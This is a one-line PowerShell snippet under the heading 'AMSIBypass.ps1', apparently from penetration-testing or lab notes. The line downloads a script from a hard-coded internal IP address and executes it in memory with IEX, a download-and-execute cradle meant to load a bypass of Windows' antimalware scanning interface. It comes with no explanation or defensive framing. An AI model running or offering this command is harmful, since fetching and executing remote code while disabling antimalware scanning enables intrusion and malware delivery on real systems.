## AMSIBypass.ps1
```powershell
(new-object net.webclient).downloadstring("http://192.168.49.89/AMSIBypass.ps1") | IEX
```